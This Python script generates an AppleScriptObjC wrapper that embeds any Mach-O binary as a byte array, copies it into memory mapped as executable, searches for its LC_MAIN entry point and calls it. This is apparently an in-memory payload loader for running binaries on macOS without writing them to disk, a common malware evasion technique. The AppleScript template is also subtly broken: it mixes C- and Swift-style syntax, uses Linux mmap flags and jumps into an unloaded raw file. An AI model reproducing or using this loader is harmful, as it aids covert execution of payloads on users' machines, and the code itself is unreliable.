#!/usr/bin/env python3
import sys

TEMPLATE = """use framework "Foundation"
use framework "Darwin"
use scripting additions

-- ======= Embedded Mach-O binary =======
set machoBytes to current application's NSData's dataWithBytes:{{
{BYTE_ARRAY}
}} length:{LENGTH}

-- Get total size in bytes
set machoLength to machoBytes's |length|()

-- ======= Allocate executable memory =======
set mem to current application's mmap(0, machoLength, 7, 0x22, -1, 0)
machoBytes's getBytes:mem length:machoLength
current application's mprotect(mem, machoLength, 5)

-- ======= Parse Mach-O header in memory =======
set headerPtr to mem as (current application's UnsafeMutablePointer)
set ncmds to headerPtr's ncmds
set offset to 32
set entryoff to 0

repeat with i from 1 to ncmds
    set cmd to *(headerPtr + offset) as load_command
    if cmd's cmd = 0x80000028 then -- LC_MAIN
        set entryoff to cmd's entryoff
        exit repeat
    end if
    set offset to offset + cmd's cmdsize
end repeat

set entryPtr to mem + entryoff
set func to (entryPtr as (()->void))
func()
"""

def generate_bytes_array(filename, bytes_per_line=12):
    """Read binary and format as AppleScript array with proper braces."""
    with open(filename, "rb") as f:
        data = f.read()
    
    lines = []
    line = []
    for i, b in enumerate(data):
        line.append(f"0x{b:02x}")
        if (i + 1) % bytes_per_line == 0:
            lines.append(", ".join(line))
            line = []
    if line:
        lines.append(", ".join(line))
    
    # Join lines with proper indentation
    return ",\n    ".join(lines), len(data)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <binary_file>", file=sys.stderr)
        sys.exit(1)
    
    infile = sys.argv[1]
    byte_array, length = generate_bytes_array(infile)
    
    output = TEMPLATE.replace("{BYTE_ARRAY}", byte_array)
    output = output.replace("{LENGTH}", str(length))
    
    print(output)

if __name__ == "__main__":
    main()

